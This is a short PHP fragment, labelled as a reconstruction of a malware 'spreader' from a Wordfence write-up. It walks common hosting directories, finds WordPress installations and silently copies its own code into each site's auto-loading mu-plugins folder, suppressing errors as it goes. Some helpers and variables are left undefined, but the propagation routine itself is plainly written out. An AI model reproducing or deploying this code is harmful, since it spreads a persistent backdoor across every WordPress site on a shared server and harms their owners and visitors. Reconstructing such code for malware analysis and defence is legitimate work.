<?php
// Reconstruction of the spreader in Wordfence's write-up (2026-09).
function sc_spread_roots() {
	return array('/home', '/var/www', '/var/www/vhosts', '/var/www/html', '/srv/www', '/srv/users', '/usr/local/www');
}
foreach (sc_find_installs(sc_spread_roots()) as $root) {
	$dest = $root . '/wp-content/mu-plugins';
	if (!is_dir($dest)) {
		@mkdir($dest, 0755, true);
	}
	@file_put_contents($dest . '/' . $name, $self);
}
